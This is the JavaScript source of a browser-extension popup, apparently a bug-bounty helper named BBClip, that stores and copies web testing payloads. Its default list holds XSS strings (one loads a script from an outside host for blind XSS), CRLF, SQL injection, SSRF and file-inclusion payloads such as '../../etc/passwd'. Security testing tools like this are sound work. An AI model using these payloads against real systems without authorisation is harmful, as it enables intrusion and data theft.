// BBClip

document.addEventListener('DOMContentLoaded', function() {
    var browser = browser || chrome
        // Object.entries(items).forEach(([key, value]) => { console.log(value.name); Object.entries(value.payloads).forEach(...)
    browser.storage.local.get(null, function(items) {
        var menu = "";
        const keys = Object.keys(items).reverse();
        for (const key of keys) {
            // `keys.forEach()`
            menu += "<li><a href=\"#\">" + items[key].name + "</a><ul>";
            for (const [payload_key, payload_value] of Object.entries(items[key].payloads)) {
                // Object.entries(items[key].payloads).forEach()
                menu += "<li><a href=\"#\" class=\"" + key + "\" id=\"copy_me\">" + payload_key + "</a></li>";
            }
            menu += "</ul></li>";
        }
        console.log(menu);
        document.querySelector(".parent-menu").innerHTML = menu;

        const copy = document.querySelectorAll("#copy_me");
        copy.forEach(element => {
            element.addEventListener('click', clickHandler)
        });

    });

    create_default_options();

});

function clickHandler(e) {
    var menu_key = e.srcElement.className;
    var payload_key = e.srcElement.innerText;
    var browser = browser || chrome;
    browser.storage.local.get(menu_key, function(items) {
        navigator.clipboard.writeText(items[menu_key].payloads[payload_key]).then(function() {
            console.log('Copied to clipboard successfully!' + items[menu_key].payloads[payload_key]);
        }, function() {
            console.error('Unable to write to clipboard. :-(' + items[menu_key].payloads[payload_key]);
        });
    });

    setTimeout(function() {
        window.close();
    }, 100);
}

function create_default_options() {

    var xss = {
        name: "XSS Injection",
        payloads: {
            "General payload": '\'\';!--"<XSS>=&{()}',
            "Basic payload": 'xss\'"><script>alert(1)</script>',
            "Polyglot": 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>',
            "Blind XSS": 'xss\'"><script src=//xss.vavkamil.cz/blind.js></script>',
        },
    }

    var crlf = {
        name: "CRLF Injection",
        payloads: {
            "%0a%0d": '%0d%0a',
            "Set-cookie": '%0d%0aSet-Cookie: crlf=true',
            "Location": '%0d%0aLocation: https://google.com',
        }
    }

    var sqli = {
        name: "SQL Injection",
        payloads: {
            "Sleep": 'SLEEP(1) /*\' or SLEEP(1) or \'" or SLEEP(1) or "*/',
            "admin' or '1'='1'--": 'admin\' or \'1\'=\'1\'--',
        }
    }

    var ssrf = {
        name: "SSRF",
        payloads: {
            "http://127.0.0.1:80": 'http://127.0.0.1:80',
            "http://[::]:80": 'http://[::]:80',
            "http://[::]:80": 'http://[::]:80',
            "http://2130706433": 'http://2130706433',
            "http://0/": 'http://0/',
        }
    }

    var lfi = {
        name: "LFI",
        payloads: {
            "base64 encode": 'php://filter/convert.base64-encode/resource=',
            "php:expect://ls": 'php:expect://ls',
            "../../etc/passwd": '../../etc/passwd',
        }
    }

    var browser = browser || chrome
    browser.storage.local.set({
        xss,
        crlf,
        sqli,
        lfi
    });
}